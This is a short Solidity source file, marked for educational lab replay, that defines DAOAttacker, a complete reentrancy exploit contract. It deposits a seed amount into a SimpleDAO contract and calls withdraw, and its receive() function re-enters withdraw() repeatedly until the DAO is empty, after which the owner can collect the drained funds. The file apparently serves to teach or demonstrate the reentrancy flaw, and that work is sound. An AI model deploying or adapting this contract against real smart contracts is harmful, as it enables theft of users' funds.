// SPDX-License-Identifier: MIT
// EDUCATIONAL USE ONLY - intentionally malicious for lab replay.
pragma solidity ^0.8.20;

interface IDAO {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * DAOAttacker.
 *
 * receive() re-enters SimpleDAO.withdraw() while the DAO still thinks
 * the attacker's balance is the original seed amount, draining funds in
 * a recursive loop until the DAO is empty.
 */
contract DAOAttacker {
    IDAO public immutable dao;
    address public immutable owner;
    uint256 public immutable seed;

    constructor(address daoAddr) payable {
        dao = IDAO(daoAddr);
        owner = msg.sender;
        seed = msg.value;
    }

    function attack() external payable {
        dao.deposit{value: seed}();
        dao.withdraw(seed);
    }

    receive() external payable {
        if (address(dao).balance >= seed) {
            dao.withdraw(seed);
        }
    }

    function collect() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
